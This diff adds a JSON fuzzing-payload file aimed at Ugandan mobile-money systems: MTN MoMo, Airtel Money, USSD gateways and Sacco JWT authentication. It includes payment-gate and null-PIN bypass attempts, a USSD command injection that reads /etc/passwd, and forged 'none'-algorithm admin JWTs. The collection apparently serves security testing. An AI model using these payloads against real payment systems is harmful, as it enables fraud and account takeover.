@@ -1,0 +1,64 @@
+{
+  "name": "East Africa Fintech Payloads",
+  "description": "Specialized fuzzing vectors for Airtel Money, MTN MoMo, and USSD APIs in the Uganda ecosystem.",
+  "categories": {
+    "MTN MoMo API": [
+      {
+        "name": "X-Reference-Id Collision",
+        "description": "Attempt to reuse a known transaction UUID to bypass payment gates.",
+        "payload": "X-Reference-Id: 00000000-0000-0000-0000-000000000000"
+      },
+      {
+        "name": "Amount Negative Value",
+        "description": "Test for negative transaction amount handling.",
+        "payload": "{\"amount\": \"-50000\", \"currency\": \"UGX\", \"externalId\": \"123\"}"
+      },
+      {
+        "name": "Amount Zero Value",
+        "description": "Test for zero transaction amount handling.",
+        "payload": "{\"amount\": \"0\", \"currency\": \"UGX\", \"externalId\": \"123\"}"
+      }
+    ],
+    "Airtel Money": [
+      {
+        "name": "PIN Bypass via Truncation",
+        "description": "Truncate the PIN payload or pass null to bypass authentication.",
+        "payload": "{\"msisdn\": \"256750000000\", \"pin\": null}"
+      },
+      {
+        "name": "Over-length MSISDN",
+        "description": "Send MSISDN longer than the allowed Airtel format (12 digits) to test for buffer/DB crashes.",
+        "payload": "{\"msisdn\": \"256750000000000000000\", \"amount\": \"1000\"}"
+      }
+    ],
+    "USSD Gateway Injection": [
+      {
+        "name": "Base USSD Code Execution (*165#)",
+        "description": "Inject a raw USSD shortcode into an input field expecting a phone number to trigger gateway misconfiguration.",
+        "payload": "*165*1#"
+      },
+      {
+        "name": "USSD URL Encoding",
+        "description": "URL-encoded version of a USSD string.",
+        "payload": "%2A165%2A1%23"
+      },
+      {
+        "name": "Command Injection via USSD",
+        "description": "Combine Unix command injection with a USSD payload.",
+        "payload": "*165#; cat /etc/passwd"
+      }
+    ],
+    "Sacco JWT Manipulation": [
+      {
+        "name": "None Algorithm",
+        "description": "Change JWT alg to 'none' and strip the signature.",
+        "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoic2FjY28tdXNlciJ9."
+      },
+      {
+        "name": "Role Escalation (Admin)",
+        "description": "Standard base64 encoded payload with role set to admin.",
+        "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoic2FjY28tdXNlciJ9.signature_placeholder"
+      }
+    ]
+  }
+}
